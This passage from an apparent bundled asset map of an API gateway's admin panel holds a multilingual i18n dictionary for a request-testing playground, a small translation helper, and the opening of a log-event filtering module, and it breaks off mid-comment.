形态一旦掺进占位符就要逐处核对。这里用不上参数，那就一个都不写。\n  // ⚠️ **协议名与模型 id 一律不进字典**：它们是专名 / 标识符，来自协议目录的响应。\n  \"pg.title\":                { \"zh-CN\": \"调试台\", \"zh-TW\": \"偵錯台\", en: \"Playground\", ja: \"プレイグラウンド\", ko: \"플레이그라운드\" },\n  \"pg.desc\":                 { \"zh-CN\": \"在面板里直接向这个网关发一次真实请求，用来确认四条协议以及图片、视频两条媒体端点各自是不是通的。\", \"zh-TW\": \"在面板裡直接向這個閘道發一次真實請求，用來確認四條協定以及圖片、影片兩條媒體端點各自是不是通的。\", en: \"Send a real request to this gateway from the panel to confirm each of the four protocols, plus the image and video endpoints, works.\", ja: \"この画面からゲートウェイへ実際にリクエストを送り、4 つのプロトコルと画像・動画の各エンドポイントが通るかを確認します。\", ko: \"콘솔에서 이 게이트웨이로 실제 요청을 보내 네 가지 프로토콜과 이미지·동영상 엔드포인트가 각각 동작하는지 확인합니다.\" },\n  // ⚠️ **这一句是 U-B 的落点，措辞不许放松成「两种形态一样」**：官方文档说 HTTP 触发的\n  //    Worker 没有墙钟上限、单条子请求也没有时间上限，但**没有**说 CDN 那条回源读超时\n  //    适不适用于 Worker 自己发出的子请求 ⇒ 按「没有平台承诺」处理。\n  \"pg.runtimeNote\":          { \"zh-CN\": \"一次非流式请求要等上游把整段回答生成完才返回，可能很慢。Worker 与 Docker 两种部署形态在超长请求上的表现不一定相同，这里不对「多久之内一定不会被中断」做任何承诺。\", \"zh-TW\": \"一次非串流請求要等上游把整段回答產生完才返回，可能很慢。Worker 與 Docker 兩種部署形態在超長請求上的表現不一定相同，這裡不對「多久之內一定不會被中斷」做任何承諾。\", en: \"A non-streaming request only returns once upstream has finished generating the whole answer, so it can be slow. The Worker and Docker deployments may behave differently on very long requests; nothing here promises how long a request is guaranteed to survive.\", ja: \"非ストリーミングのリクエストは上流が回答全体を生成し終えるまで返りません。非常に長いリクエストでは Worker と Docker の挙動が同じとは限らず、「何秒までは必ず中断されない」といった保証はここでは一切行いません。\", ko: \"비스트리밍 요청은 업스트림이 답변 전체를 만들어야 반환되므로 느릴 수 있습니다. 아주 긴 요청에서는 Worker와 Docker의 동작이 같다고 볼 수 없으며, 여기서는 「몇 초까지는 반드시 끊기지 않는다」는 약속을 하지 않습니다.\" },\n  \"pg.req.title\":            { \"zh-CN\": \"请求配置\", \"zh-TW\": \"請求設定\", en: \"Request\", ja: \"リクエスト設定\", ko: \"요청 설정\" },\n  \"pg.mode.label\":           { \"zh-CN\": \"模式\", \"zh-TW\": \"模式\", en: \"Mode\", ja: \"モード\", ko: \"모드\" },\n  \"pg.mode.chat\":            { \"zh-CN\": \"对话\", \"zh-TW\": \"對話\", en: \"Chat\", ja: \"チャット\", ko: \"대화\" },\n  \"pg.mode.image\":           { \"zh-CN\": \"图片\", \"zh-TW\": \"圖片\", en: \"Image\", ja: \"画像\", ko: \"이미지\" },\n  \"pg.mode.video\":           { \"zh-CN\": \"视频\", \"zh-TW\": \"影片\", en: \"Video\", ja: \"動画\", ko: \"동영상\" },\n  \"pg.proto.label\":          { \"zh-CN\": \"协议\", \"zh-TW\": \"協定\", en: \"Protocol\", ja: \"プロトコル\", ko: \"프로토콜\" },\n  \"pg.model.label\":          { \"zh-CN\": \"模型\", \"zh-TW\": \"模型\", en: \"Model\", ja: \"モデル\", ko: \"모델\" },\n  \"pg.model.noneMedia\":      { \"zh-CN\": \"这个形态下没有可用的模型。\", \"zh-TW\": \"這個形態下沒有可用的模型。\", en: \"No model is available for this modality.\", ja: \"この種類で利用できるモデルがありません。\", ko: \"이 형태에서 사용할 수 있는 모델이 없습니다.\" },\n  \"pg.model.none\":           { \"zh-CN\": \"这条协议上没有可用的模型，换一条协议试试。\", \"zh-TW\": \"這條協定上沒有可用的模型，換一條協定試試。\", en: \"No model is available on this protocol; try another one.\", ja: \"このプロトコルで利用できるモデルがありません。別のプロトコルをお試しください。\", ko: \"이 프로토콜에서 사용할 수 있는 모델이 없습니다. 다른 프로토콜을 사용해 보세요.\" },\n  \"pg.stream.label\":         { \"zh-CN\": \"流式\", \"zh-TW\": \"串流\", en: \"Streaming\", ja: \"ストリーミング\", ko: \"스트리밍\" },\n  \"pg.stream.tip\":           { \"zh-CN\": \"打开后回答会一块一块地到，右栏边收边显示；这一档不统计 token。\", \"zh-TW\": \"打開後回答會一塊一塊地到，右欄邊收邊顯示；這一檔不統計 token。\", en: \"When on, the answer arrives in chunks and the right column fills in as it goes; this mode reports no token counts.\", ja: \"オンにすると回答が少しずつ届き、右側に順次表示されます。このモードでは token 数は表示されません。\", ko: \"켜면 답변이 조각으로 도착해 오른쪽에 차례로 표시됩니다. 이 모드에서는 token 수를 집계하지 않습니다.\" },\n  \"pg.token.label\":          { \"zh-CN\": \"网关口令\", \"zh-TW\": \"閘道口令\", en: \"Gateway token\", ja: \"ゲートウェイトークン\", ko: \"게이트웨이 토큰\" },\n  \"pg.token.placeholder\":    { \"zh-CN\": \"粘贴 GATEWAY_TOKEN\", \"zh-TW\": \"貼上 GATEWAY_TOKEN\", en: \"Paste GATEWAY_TOKEN\", ja: \"GATEWAY_TOKEN を貼り付け\", ko: \"GATEWAY_TOKEN 붙여넣기\" },\n  // ⚠️ 这句话必须说清「面板拿不到它」，否则运维会一直找那颗并不存在的「填入我的口令」按钮。\n  \"pg.token.note\":           { \"zh-CN\": \"这把口令由你手动粘贴，只存在这台浏览器里。面板读不到它的明文（凭据只写不读），所以没有「一键填入」。\", \"zh-TW\": \"這把口令由你手動貼上，只存在這台瀏覽器裡。面板讀不到它的明文（憑據只寫不讀），所以沒有「一鍵填入」。\", en: \"You paste this token yourself and it stays in this browser. The panel cannot read its plaintext (credentials are write-only), so there is no auto-fill.\", ja: \"このトークンはご自身で貼り付け、このブラウザーにのみ保存されます。画面側は平文を読み取れない（資格情報は書き込み専用）ため、自動入力はありません。\", ko: \"이 토큰은 직접 붙여넣으며 이 브라우저에만 저장됩니다. 콘솔은 평문을 읽을 수 없으므로(자격 증명은 쓰기 전용) 자동 채우기는 없습니다.\" },\n  \"pg.token.stateEmpty\":     { \"zh-CN\": \"还没粘口令\", \"zh-TW\": \"還沒貼口令\", en: \"No token pasted yet\", ja: \"トークン未入力\", ko: \"토큰이 아직 없습니다\" },\n  // ⚠️ 「比不了」与「对不上」是两句话，**不许折叠成一档**：折叠之后运维会去改一把其实没错的口令。\n  \"pg.token.stateUnknown\":   { \"zh-CN\": \"读不到设置页里的末位提示，这次比不了\", \"zh-TW\": \"讀不到設定頁裡的末位提示，這次比不了\", en: \"Cannot read the stored token hint, so no comparison was made\", ja: \"設定側の末尾ヒントを取得できないため、照合できません\", ko: \"설정의 끝자리 힌트를 읽을 수 없어 대조하지 못했습니다\" },\n  \"pg.token.stateMatch\":     { \"zh-CN\": \"末位与设置页里配的那把一致\", \"zh-TW\": \"末位與設定頁裡配的那把一致\", en: \"Last characters match the configured token\", ja: \"末尾が設定済みのトークンと一致します\", ko: \"끝자리가 설정된 토큰과 일치합니다\" },\n  \"pg.token.stateMismatch\":  { \"zh-CN\": \"末位与设置页里配的那把对不上\", \"zh-TW\": \"末位與設定頁裡配的那把對不上\", en: \"Last characters do not match the configured token\", ja: \"末尾が設定済みのトークンと一致しません\", ko: \"끝자리가 설정된 토큰과 일치하지 않습니다\" },\n  \"pg.prompt.label\":         { \"zh-CN\": \"提示词\", \"zh-TW\": \"提示詞\", en: \"Prompt\", ja: \"プロンプト\", ko: \"프롬프트\" },\n  \"pg.prompt.placeholder\":   { \"zh-CN\": \"输入要发给模型的一句话\", \"zh-TW\": \"輸入要發給模型的一句話\", en: \"Type a message to send to the model\", ja: \"モデルに送る文章を入力\", ko: \"모델에 보낼 문장을 입력\" },\n  \"pg.send\":                 { \"zh-CN\": \"发送\", \"zh-TW\": \"發送\", en: \"Send\", ja: \"送信\", ko: \"보내기\" },\n  \"pg.cancel\":               { \"zh-CN\": \"取消这一次\", \"zh-TW\": \"取消這一次\", en: \"Cancel this request\", ja: \"このリクエストを中止\", ko: \"이 요청 취소\" },\n  \"pg.sending\":              { \"zh-CN\": \"正在等上游返回…\", \"zh-TW\": \"正在等上游返回…\", en: \"Waiting for upstream…\", ja: \"上流からの応答を待っています…\", ko: \"업스트림 응답을 기다리는 중…\" },\n  \"pg.send.ready\":           { \"zh-CN\": \"按一下会真的向上游发一次请求。\", \"zh-TW\": \"按一下會真的向上游發一次請求。\", en: \"Each click really does send one request upstream.\", ja: \"クリックするたびに上流へ実際にリクエストを 1 回送ります。\", ko: \"누를 때마다 업스트림으로 실제 요청을 한 번 보냅니다.\" },\n  \"pg.send.readyVideo\":      { \"zh-CN\": \"按一下会真的向上游发请求：一次视频任务是 1 次建任务 + 最多 {count} 次轮询查询。\", \"zh-TW\": \"按一下會真的向上游發請求：一次影片任務是 1 次建任務 + 最多 {count} 次輪詢查詢。\", en: \"Each click really does hit upstream: one video job is 1 create request plus up to {count} polling requests.\", ja: \"クリックすると上流へ実際にリクエストを送ります。動画タスク 1 件はタスク作成 1 回 + 最大 {count} 回のポーリングです。\", ko: \"누르면 업스트림으로 실제 요청을 보냅니다. 동영상 작업 1건은 생성 요청 1회와 최대 {count}회의 폴링으로 이루어집니다.\" },\n  \"pg.send.blockedInFlight\": { \"zh-CN\": \"上一次请求还在飞，等它回来或者取消它。\", \"zh-TW\": \"上一次請求還在飛，等它回來或者取消它。\", en: \"The previous request is still in flight; wait for it or cancel it.\", ja: \"前回のリクエストがまだ実行中です。完了を待つか中止してください。\", ko: \"이전 요청이 아직 진행 중입니다. 완료를 기다리거나 취소하세요.\" },\n  \"pg.send.blockedNoProto\":  { \"zh-CN\": \"先选一条协议。\", \"zh-TW\": \"先選一條協定。\", en: \"Pick a protocol first.\", ja: \"先にプロトコルを選んでください。\", ko: \"먼저 프로토콜을 선택하세요.\" },\n  \"pg.send.blockedNoEndpoint\": { \"zh-CN\": \"协议目录里没有这个形态的端点，这一档发不出请求。\", \"zh-TW\": \"協定目錄裡沒有這個形態的端點，這一檔發不出請求。\", en: \"The protocol catalog has no endpoint for this modality, so nothing can be sent from this mode.\", ja: \"プロトコルカタログにこの種類のエンドポイントがないため、このモードからは送信できません。\", ko: \"프로토콜 카탈로그에 이 형태의 엔드포인트가 없어 이 모드에서는 요청을 보낼 수 없습니다.\" },\n  \"pg.send.blockedNoModel\":  { \"zh-CN\": \"先选一个模型。\", \"zh-TW\": \"先選一個模型。\", en: \"Pick a model first.\", ja: \"先にモデルを選んでください。\", ko: \"먼저 모델을 선택하세요.\" },\n  \"pg.send.blockedNoToken\":  { \"zh-CN\": \"先粘贴网关口令。\", \"zh-TW\": \"先貼上閘道口令。\", en: \"Paste the gateway token first.\", ja: \"先にゲートウェイトークンを貼り付けてください。\", ko: \"먼저 게이트웨이 토큰을 붙여넣으세요.\" },\n  \"pg.send.blockedNoPrompt\": { \"zh-CN\": \"先写一句提示词。\", \"zh-TW\": \"先寫一句提示詞。\", en: \"Type a prompt first.\", ja: \"先にプロンプトを入力してください。\", ko: \"먼저 프롬프트를 입력하세요.\" },\n  \"pg.conv.title\":           { \"zh-CN\": \"对话\", \"zh-TW\": \"對話\", en: \"Conversation\", ja: \"やり取り\", ko: \"대화\" },\n  \"pg.conv.empty\":           { \"zh-CN\": \"还没有发过请求。左栏配好之后按「发送」。\", \"zh-TW\": \"還沒有發過請求。左欄配好之後按「發送」。\", en: \"No request has been sent yet. Configure the left column, then press Send.\", ja: \"まだリクエストを送っていません。左側を設定してから「送信」を押してください。\", ko: \"아직 요청을 보내지 않았습니다. 왼쪽을 설정한 뒤 「보내기」를 누르세요.\" },\n  \"pg.turn.you\":             { \"zh-CN\": \"你发出的\", \"zh-TW\": \"你發出的\", en: \"Sent\", ja: \"送信内容\", ko: \"보낸 내용\" },\n  // ⚠️ 「网关回的」而不是「模型回的」：中间隔着这个网关的协议转换，说成后者会把\n  //    一次网关侧的错误归到模型头上。\n  \"pg.turn.gateway\":         { \"zh-CN\": \"网关回的\", \"zh-TW\": \"閘道回的\", en: \"Gateway replied\", ja: \"ゲートウェイの応答\", ko: \"게이트웨이 응답\" },\n  \"pg.turn.streamEmpty\":     { \"zh-CN\": \"这条流读完了，但里面一个字的正文都没有。\", \"zh-TW\": \"這條串流讀完了，但裡面一個字的正文都沒有。\", en: \"This stream finished without carrying a single character of answer text.\", ja: \"このストリームは完了しましたが、本文が 1 文字も含まれていませんでした。\", ko: \"이 스트림은 끝났지만 본문이 한 글자도 들어 있지 않았습니다.\" },\n  \"pg.turn.cancelled\":       { \"zh-CN\": \"这一次被你取消了，上面那段是取消之前真的收到的内容。\", \"zh-TW\": \"這一次被你取消了，上面那段是取消之前真的收到的內容。\", en: \"You cancelled this request; the text above is what really arrived before it stopped.\", ja: \"このリクエストは中止されました。上の本文は中止前に実際に届いた内容です。\", ko: \"이 요청은 취소되었습니다. 위 본문은 중단되기 전에 실제로 도착한 내용입니다.\" },\n  \"pg.turn.malformed\":       { \"zh-CN\": \"这条流里有 {count} 块数据读不出来，已跳过——上面这段回答可能是缺字的。\", \"zh-TW\": \"這條串流裡有 {count} 塊資料讀不出來，已跳過——上面這段回答可能是缺字的。\", en: \"{count} chunk(s) in this stream could not be read and were skipped — the answer above may be missing characters.\", ja: \"このストリームでは {count} 個のチャンクを読み取れず、スキップしました。上の回答は文字が欠けている可能性があります。\", ko: \"이 스트림에서 {count}개의 청크를 읽지 못해 건너뛰었습니다. 위 답변은 글자가 빠졌을 수 있습니다.\" },\n  \"pg.turn.noTokens\":        { \"zh-CN\": \"流式响应不带 token 用量，所以这里不显示数字——显示 0 会是假的。\", \"zh-TW\": \"串流回應不帶 token 用量，所以這裡不顯示數字——顯示 0 會是假的。\", en: \"Streaming responses carry no token usage, so no number is shown here — showing 0 would be false.\", ja: \"ストリーミング応答には token 使用量が含まれないため、ここには数値を表示しません。0 と表示するのは誤りになります。\", ko: \"스트리밍 응답에는 token 사용량이 없으므로 여기에 숫자를 표시하지 않습니다. 0으로 표시하면 거짓이 됩니다.\" },\n  \"pg.turn.unreadable\":      { \"zh-CN\": \"这次的响应体读不出来（不是空响应，是解析不了）。\", \"zh-TW\": \"這次的回應內容讀不出來（不是空回應，是解析不了）。\", en: \"This response body could not be read — it is not empty, it could not be parsed.\", ja: \"今回のレスポンス本文を読み取れませんでした（空ではなく、解析できませんでした）。\", ko: \"이번 응답 본문을 읽지 못했습니다(비어 있는 것이 아니라 파싱하지 못했습니다).\" },\n  \"pg.err.buildFailed\":      { \"zh-CN\": \"这次请求没能构造出来：协议目录里的样例形状与面板对不上，请核对两边的版本。\", \"zh-TW\": \"這次請求沒能構造出來：協定目錄裡的樣例形狀與面板對不上，請核對兩邊的版本。\", en: \"The request could not be built: the sample shape in the protocol catalog does not match what this panel expects — check that both sides are on the same version.\", ja: \"リクエストを組み立てられませんでした。プロトコルカタログのサンプル形状がこの画面の想定と合いません。両者のバージョンを確認してください。\", ko: \"요청을 만들지 못했습니다. 프로토콜 카탈로그의 샘플 형태가 이 콘솔의 기대와 다릅니다. 양쪽 버전을 확인하세요.\" },\n  \"pg.err.crossOrigin\":      { \"zh-CN\": \"这次请求一个字节都没发出去：拼出来的地址不在本面板所在的源上。口令不会被送去别处。\", \"zh-TW\": \"這次請求一個位元組都沒發出去：拼出來的位址不在本面板所在的來源上。口令不會被送去別處。\", en: \"Nothing was sent: the assembled address is not on this panel's own origin. The token was not sent anywhere.\", ja: \"今回は 1 バイトも送信していません。組み立てたアドレスがこの画面のオリジンではありません。トークンはどこにも送られていません。\", ko: \"이번에는 한 바이트도 보내지 않았습니다. 조립된 주소가 이 콘솔의 출처가 아닙니다. 토큰은 어디로도 전송되지 않았습니다.\" },\n  \"pg.err.transport\":        { \"zh-CN\": \"这次请求没有拿到任何响应：可能是断网、被取消，或者请求本身失败了。这与上游的状态无关。\", \"zh-TW\": \"這次請求沒有拿到任何回應：可能是斷網、被取消，或者請求本身失敗了。這與上游的狀態無關。\", en: \"This request got no response at all: the network may be down, it may have been cancelled, or the request itself failed. This says nothing about upstream.\", ja: \"今回のリクエストは応答をまったく受け取れませんでした。ネットワーク断、中止、あるいはリクエスト自体の失敗が考えられます。上流の状態とは無関係です。\", ko: \"이번 요청은 아무 응답도 받지 못했습니다. 네트워크 문제, 취소, 또는 요청 자체의 실패일 수 있습니다. 업스트림 상태와는 무관합니다.\" },\n  \"pg.err.stream\":           { \"zh-CN\": \"这条流没读完就断了。上面那段正文是真的收到过的，后面还有多少不知道。\", \"zh-TW\": \"這條串流沒讀完就斷了。上面那段正文是真的收到過的，後面還有多少不知道。\", en: \"This stream broke off before it finished. The text above really did arrive; how much was still to come is unknown.\", ja: \"このストリームは完了前に切断されました。上の本文は実際に届いたものですが、残りがどれだけあったかは分かりません。\", ko: \"이 스트림은 끝나기 전에 끊겼습니다. 위 본문은 실제로 도착한 내용이며, 남은 분량은 알 수 없습니다.\" },\n  \"pg.media.endpoint\":       { \"zh-CN\": \"这一档打的端点\", \"zh-TW\": \"這一檔打的端點\", en: \"Endpoint for this mode\", ja: \"このモードのエンドポイント\", ko: \"이 모드가 호출하는 엔드포인트\" },\n  \"pg.media.copy\":           { \"zh-CN\": \"复制\", \"zh-TW\": \"複製\", en: \"Copy\", ja: \"コピー\", ko: \"복사\" },\n  \"pg.media.open\":           { \"zh-CN\": \"在新标签页打开\", \"zh-TW\": \"在新分頁開啟\", en: \"Open in a new tab\", ja: \"新しいタブで開く\", ko: \"새 탭에서 열기\" },\n  \"pg.media.alt\":            { \"zh-CN\": \"上游返回的图片。内嵌的是 data 形式的内容，没有向任何远端发起请求。\", \"zh-TW\": \"上游返回的圖片。內嵌的是 data 形式的內容，沒有向任何遠端發起請求。\", en: \"Image returned by upstream. It is embedded as inline data, so no request was made to any remote host.\", ja: \"上流が返した画像です。data 形式で埋め込んでいるため、外部のホストへのリクエストは発生していません。\", ko: \"업스트림이 반환한 이미지입니다. data 형식으로 삽입되므로 어떤 원격 호스트에도 요청하지 않습니다.\" },\n  \"pg.media.bytes\":          { \"zh-CN\": \"上游这次直接回的是一段字节流（{type}），不是一份带地址的结果。面板不内嵌媒体，所以这里只报告它的类型。\", \"zh-TW\": \"上游這次直接回的是一段位元組流（{type}），不是一份帶位址的結果。面板不內嵌媒體，所以這裡只報告它的類型。\", en: \"Upstream returned raw bytes this time ({type}), not a result carrying a URL. The panel never embeds media, so only the type is reported here.\", ja: \"今回、上流はアドレス付きの結果ではなくバイト列（{type}）をそのまま返しました。この画面はメディアを埋め込まないため、種類のみを表示します。\", ko: \"이번에 업스트림은 주소가 담긴 결과가 아니라 바이트 스트림({type})을 그대로 반환했습니다. 콘솔은 미디어를 삽입하지 않으므로 여기서는 형식만 알려 줍니다.\" },\n  \"pg.media.none\":           { \"zh-CN\": \"这次的响应里没有出现任何一条媒体地址。下面是网关原样返回的内容。\", \"zh-TW\": \"這次的回應裡沒有出現任何一條媒體位址。下面是閘道原樣返回的內容。\", en: \"No media address appeared in this response. Below is exactly what the gateway returned.\", ja: \"今回の応答にはメディアのアドレスが 1 件も含まれていません。以下はゲートウェイがそのまま返した内容です。\", ko: \"이번 응답에는 미디어 주소가 하나도 없습니다. 아래는 게이트웨이가 그대로 반환한 내용입니다.\" },\n  \"pg.media.taskId\":         { \"zh-CN\": \"任务标识\", \"zh-TW\": \"任務識別碼\", en: \"Task ID\", ja: \"タスク ID\", ko: \"작업 ID\" },\n  \"pg.media.polling\":        { \"zh-CN\": \"正在轮询这个任务的结果，已经查过 {count} 次。\", \"zh-TW\": \"正在輪詢這個任務的結果，已經查過 {count} 次。\", en: \"Polling this task for its result; {count} check(s) so far.\", ja: \"このタスクの結果を確認中です。これまでに {count} 回問い合わせました。\", ko: \"이 작업의 결과를 폴링하는 중입니다. 지금까지 {count}회 조회했습니다.\" },\n  \"pg.media.pollGaveUp\":     { \"zh-CN\": \"轮询已经到上限，先停下了——任务本身可能仍在进行。请稍后拿上面这个任务标识再查一次。\", \"zh-TW\": \"輪詢已經到上限，先停下了——任務本身可能仍在進行。請稍後拿上面這個任務識別碼再查一次。\", en: \"Polling hit its limit and stopped — the task itself may still be running. Check again later using the task ID above.\", ja: \"ポーリングが上限に達したため停止しました。タスク自体はまだ実行中の可能性があります。後ほど上のタスク ID で再度確認してください。\", ko: \"폴링이 상한에 도달해 중단했습니다. 작업 자체는 아직 진행 중일 수 있습니다. 잠시 후 위의 작업 ID로 다시 조회하세요.\" },\n  \"pg.media.noTaskId\":       { \"zh-CN\": \"建任务的响应里没有一格能当任务标识用的 id，面板不替你猜，所以这次没有自动轮询。\", \"zh-TW\": \"建任務的回應裡沒有一格能當任務識別碼用的 id，面板不替你猜，所以這次沒有自動輪詢。\", en: \"The create-task response carried no field usable as a task ID; the panel will not guess one, so nothing was polled.\", ja: \"タスク作成の応答にタスク ID として使える項目がありませんでした。画面側で推測はしないため、今回はポーリングを行っていません。\", ko: \"작업 생성 응답에 작업 ID로 쓸 수 있는 항목이 없었습니다. 콘솔은 추측하지 않으므로 이번에는 폴링하지 않았습니다.\" },\n  \"pg.unavailable\":          { \"zh-CN\": \"协议目录读不出来，所以这里什么都配不了——不是这个网关一条协议都没有。\", \"zh-TW\": \"協定目錄讀不出來，所以這裡什麼都配不了——不是這個閘道一條協定都沒有。\", en: \"The protocol catalog could not be read, so nothing can be configured here — it is not that the gateway has no protocols.\", ja: \"プロトコルカタログを取得できなかったため、ここでは何も設定できません。ゲートウェイにプロトコルがないという意味ではありません。\", ko: \"프로토콜 카탈로그를 읽지 못해 여기서는 아무것도 설정할 수 없습니다. 게이트웨이에 프로토콜이 없다는 뜻이 아닙니다.\" },\n};\n", type: "text/javascript; charset=utf-8", etag: "\"8413764d18b856f2\"" },
  "/admin/js/i18n.js": { body: "/**\n * i18n。三个标记钩子 + 一个兜底机制。\n *\n * `t()` 找不到 key 时**返回 key 本身**（生产不该因为缺一句翻译就白屏），\n * 但 `DEBUG_STORE` 这个存储键为真时在控制台告警——开发期看得见，生产期不打扰。\n *\n * **兜底机制（照抄 kiro2api，理由相同）**：切语言时框架层做两件事——\n * `apply(document)` **加上**重新调用当前板块的 `onShow()` 整页重绘。\n * 有些标签是渲染时用 `t()` 拼进 textContent 的、没有 data-i18n 属性，`apply()` 抓不到。\n * 框架层强制重跑保证**不管板块自己写得对不对，切语言都一定生效**。\n * ⇒ **板块内不许再各自监听 langchange**（kiro2api 有 4 处冗余监听，是历史遗留）。\n */\nimport { I18N } from \"./i18n-dict.js\";\n// 键名的单一真源，见该模块文件头（全分支评审 C4）。\nimport { LANG_STORE as STORE, DEBUG_STORE } from \"./pure/storage-keys.mjs\";\n\nexport const LANGS = [\"zh-CN\", \"zh-TW\", \"en\", \"ja\", \"ko\"];\nconst FALLBACK = \"zh-CN\";\n\nfunction readLang() {\n  try {\n    const v = localStorage.getItem(STORE);\n    if (v && LANGS.includes(v)) return v;\n  } catch (e) { /* 隐私模式：走默认 */ }\n  return FALLBACK;\n}\n\nlet lang = readLang();\n\nexport function currentLang() { return lang; }\n\nexport function t(key, params) {\n  const row = I18N[key];\n  let s = row ? (row[lang] ?? row[FALLBACK]) : undefined;\n  if (s === undefined) {\n    try {\n      if (localStorage.getItem(DEBUG_STORE)) console.warn(\"[i18n] 缺 key:\", key);\n    } catch (e) { /* ignore */ }\n    return key;\n  }\n  if (params) for (const [k, v] of Object.entries(params)) s = s.split(`{${k}}`).join(String(v));\n  return s;\n}\n\n/** 三个标记钩子。全部走 textContent / setAttribute，**永不 innerHTML**。 */\nexport function apply(root) {\n  const scope = root || document;\n  for (const el of scope.querySelectorAll(\"[data-i18n]\")) el.textContent = t(el.getAttribute(\"data-i18n\"));\n  for (const el of scope.querySelectorAll(\"[data-i18n-ph]\")) el.setAttribute(\"placeholder\", t(el.getAttribute(\"data-i18n-ph\")));\n  for (const el of scope.querySelectorAll(\"[data-i18n-title]\")) {\n    const s = t(el.getAttribute(\"data-i18n-title\"));\n    el.setAttribute(\"title\", s);\n    // 无 aria-label 时一并写：图标按钮只有 title 的话读屏器读不出来。\n    if (!el.hasAttribute(\"aria-label\")) el.setAttribute(\"aria-label\", s);\n  }\n}\n\nexport function setLang(next) {\n  if (!LANGS.includes(next)) return;\n  lang = next;\n  try { localStorage.setItem(STORE, next); } catch (e) { /* ignore */ }\n  document.documentElement.setAttribute(\"data-lang\", next);\n  document.documentElement.lang = next;\n  apply(document);\n  document.dispatchEvent(new CustomEvent(\"langchange\", { detail: { lang: next } }));\n}\n", type: "text/javascript; charset=utf-8", etag: "\"f6fbcf3e9319f901\"" },
  "/admin/js/pure/events.mjs": { body: "/**\n * 事件板块的**全部取值决策**。板块文件（`js/sec-events.js`）只剩 DOM 拼装、\n * 网络调用与 i18n 查表。理由与 `pure/keys.mjs` / `pure/overview.mjs` 同一条\n * （admin-ui/README.md 硬规则 1）。\n *\n * 这个目录下的文件受三条硬规则约束（禁 import、禁浏览器全局、纯文本校验），\n * 规则全文见 admin-ui/README.md。\n */\n\n/** 轮询最短间隔（页面可见、内容有变化时）。 */\nexport const EVENTS_POLL_MIN_MS = 15_000;\n/** 轮询最长间隔（内容连续无变化时指数退避到这里封顶）。 */\nexport const EVENTS_POLL_MAX_MS = 60_000;\n\n/** 四个日志级别，顺序即级别按钮组的渲染顺序。不含 \"all\"（那是\"不筛\"，另处理）。 */\nexport const LEVELS = [\"debug\", \"info\", \"warn\", \"error\"];\n\n/**\n * 级别按钮组用的 i18n key——**只用于工具栏的筛选按钮**，入参恒是 `LEVELS` 里的\n * 一个（调用方 `for (const lvl of LEVELS)` 保证）。\"全部级别\" 按钮的文案由调用方\n * 直接写字面量 `\"ev.level.all\"`，不经过这个函数。\n */\nexport function levelLabelKey(level) {\n  if (level === \"debug\") return \"ev.level.debug\";\n  if (level === \"info\") return \"ev.level.info\";\n  if (level === \"warn\") return \"ev.level.warn\";\n  return \"ev.level.error\";\n}\n\n/**\n * **评审 I4**：一条事件真实的 `level` 字段来自接口响应，可能缺失/畸形——\n * 原来 `eventRow` 里 `typeof item.level === \"string\" ? item.level : \"info\"` 会把\n * 这类数据**伪装成 info**（绿色徽章），与\"绝不伪造\"的产品不变式矛盾。这里给出\n * 唯一的判据：四个已知级别原样透传，其余（含 `undefined`/数字/畸形字符串）一律\n * 归到显式的 `\"unknown\"` 档，不冒充任何一个已知级别。\n */\nexport function effectiveLevel(item) {\n  const level = item && typeof item === \"object\" ? item.level : undefined;\n  return (LEVELS.includes(level)) ? level : \"unknown\";\n}\n\n/** `effectiveLevel()` 的结果 → i18n key，与 `levelLabelKey` 分开：这个要接受 \"unknown\"。 */\nexport function eventLevelLabelKey(level) {\n  if (level === \"debug\") return \"ev.level.debug\";\n  if (level === \"info\") return \"ev.level.info\";\n  if (level === \"warn\") return \"ev.level.warn\";\n  if (level === \"error\") return \"ev.level.error\";\n  return \"ev.level.unknown\";\n}\n\n/**\n * 级别徽章颜色。与 `pure/keys.mjs` 的 `badgeClass` 同一套配色语义。\n * **`\"unknown\"` 单独一档**（灰色/muted），不落进任何一个\"看起来正常\"的颜色。\n */\nexport function levelBadgeClass(level) {\n  if (level === \"error\") return \"badge badge-danger\";\n  if (level === \"warn\") return \"badge badge-warn\";\n  if (level === \"debug\" || level === \"info\") return \"badge badge-ok\";\n  return \"badge\"; // unknown：不给任何一种\"正常/异常\"的颜色暗示\n}\n\n/**\n * `GET /admin/api/events` 的查询串。\n *\n * `level` 为 `\"all\"`（或任何不认识的值）时**不发这个参数**——与 `keysQuery` 的\n * `bucket` 处理同一条理由：后端把无法识别的值当作不筛，发过去只是噪音。\n */\nexport function eventsQuery(state) {\n  const parts = [];\n  if (typeof state.after === \"number\" && Number.isFinite(state.after)) parts.push(`after=${state.after}`);\n  if (LEVELS.includes(state.level)) parts.push(`level=${encodeURIComponent(state.level)}`);\n  if (typeof state.limit === \"number\" && Number.isFinite(state.limit)) parts.push(`limit=${state.limit}`);\n  return parts.join(\"&\");\n}\n\n/** 「这份响应里有没有可渲染的条目」——同 `pure/keys.mjs` 的 `itemsOf`，全模块唯一判据。 */\nexport function itemsOf(body) {\n  return body && typeof body === \"object\" && Array.isArray(body.items) ? body.items : null;\n}\n\n/**\n * 事件列表区该显示哪条消息（`null` = 显示表格）。与 `pure/keys.mjs` 的\n * `listMessageKey` 同一个模式（判据一律不写在 `sec-events.js` 里，见硬规则 1）。\n *\n * **评审 M5**：原来 `sec-events.js` 用一个模块级的 `everLoaded` 标记（\"这次进入\n * 本板块之后有没有成功过一次\"），`onShow()` 每次都把它重置成 `false`——于是重新\n * 进入本板块时，只要第一轮轮询恰好失败，就会把 `view` 里明明还留着的历史事件\n * 整段换成\"读取失败\"，即使数据一直都在，只是这一轮没刷新成功。\n *\n * 判据改成只看 `viewLength`（视图里有没有数据）而不是\"这一次有没有成功过\"：\n * 只要视图里还有数据，哪怕最新一轮轮询失败了，也继续显示已有数据（轮询指示灯\n * 会转成\"出错\"提示这件事，不需要靠替换整个列表区来提示）；只有视图本身是空的\n * 且这一轮又失败了，才说\"读取失败\"。\n *\n * ⚠️ **`cleared` 这一档是全分支评审 I5，修的是一个已经上线的、面板对运维说假话的\n * 缺陷。** 点\"清空\"之后 `view` 变成 `[]`，而原来这里只看 `viewLength === 0`，\n * 于是列表区显示**「还没有事件。」**——与同一个按钮的 tooltip（\"只清前端当前显示的\n * 列表，不影响服务端已落盘的事件\"）当场自相矛盾，而且它说的那件事是假的：服务端\n * 明明有事件。运维照着这句话会得出\"这个部署从来没出过事\"的结论。\n *\n * **\"清空\"的语义刻意保持不变**（游标不回退，被清掉的不会自动回来）：这个按钮的\n * 